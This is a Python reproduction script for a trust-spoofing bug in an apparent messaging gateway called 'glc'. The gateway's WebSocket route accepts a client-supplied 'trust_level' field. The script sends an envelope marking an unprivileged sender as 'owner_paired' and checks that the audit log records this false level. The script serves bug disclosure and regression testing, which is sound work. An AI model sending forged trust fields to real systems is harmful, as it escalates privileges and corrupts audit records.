"""Reproduction: the gateway's WebSocket ingestion route trusts the
`trust_level` field supplied in the inbound envelope instead of
re-deriving it from the pairing store via glc.security.trust_level.classify().

A caller on the adapter->gateway boundary (a compromised channel adapter,
which holds the install token) can therefore assert ANY trust level for
ANY sender. Here an allowlisted-but-unprivileged sender ("mallory",
whose authoritative trust is `untrusted`) is recorded in the audit trail
as `owner_paired` simply by saying so on the wire.

Invariant broken: #2 (every action must be checked against the ACTUAL
user) at the arrow-2 trust boundary; the falsified label also corrupts
the audit trail (#7).

Run from a fresh checkout:  python repro_trust_spoof.py
Exit code 0 = bug reproduced (spoof accepted). Exit code 1 = not vulnerable.
"""

from __future__ import annotations

import json
import os
import sys
import tempfile
from datetime import datetime, timezone

_TMP = tempfile.mkdtemp(prefix="glc-trust-repro-")
os.environ["GLC_CONFIG_DIR"] = _TMP
os.environ["GLC_AUDIT_DB"] = os.path.join(_TMP, "audit.sqlite")
os.environ["GLC_GATEWAY_DB"] = os.path.join(_TMP, "gateway.sqlite")
os.environ["GLC_PAIRING_DB"] = os.path.join(_TMP, "pairings.sqlite")

# Realistic operator config: webui is enabled and a regular user
# ("mallory") is on the allowlist so their messages are processed.
# mallory is NOT paired as anyone in the pairing store.
with open(os.path.join(_TMP, "channels.yaml"), "w") as fh:
    fh.write(
        "defaults:\n"
        "  rate_limits: {messages_per_minute: 30, tool_calls_per_minute: 20}\n"
        "  allowed_senders: []\n"
        "  mention_only_in_public: true\n"
        "channels:\n"
        "  webui: {enabled: true, allowed_senders: ['mallory']}\n"
    )

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from fastapi.testclient import TestClient  # noqa: E402

from glc.audit import query as audit_query  # noqa: E402
from glc.config import get_or_create_install_token  # noqa: E402
from glc.main import app  # noqa: E402
from glc.security.trust_level import classify  # noqa: E402


def main() -> int:
    with TestClient(app) as client:
        token = get_or_create_install_token()

        authoritative = classify("webui", "mallory")
        print(f"[*] Server's authoritative view: classify('webui','mallory') = {authoritative!r}")

        spoofed = {
            "channel": "webui",
            "channel_user_id": "mallory",
            "user_handle": "mallory",
            "text": "escalate me",
            "trust_level": "owner_paired",  # <-- the lie
            "arrived_at": datetime.now(timezone.utc).isoformat(),
        }
        with client.websocket_connect(
            "/v1/channels/webui", headers={"Authorization": f"Bearer {token}"}
        ) as ws:
            ws.send_text(json.dumps(spoofed))
            ws.receive_text()  # echo reply

        rows = [r for r in audit_query(limit=20) if r["event_type"] == "inbound_message"]
        assert rows, "no inbound_message was recorded"
        recorded = rows[0]["trust_level"]
        print(f"[*] Audit log recorded trust_level for mallory's message = {recorded!r}")

        if recorded == "owner_paired" and authoritative != "owner_paired":
            print(
                "\n[VULNERABLE] The gateway recorded the wire-supplied 'owner_paired' "
                f"even though the pairing store classifies mallory as {authoritative!r}. "
                "An adapter can assert any trust level it likes."
            )
            return 0
        print("\n[OK] The gateway re-derived the trust level; the spoof was ignored.")
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
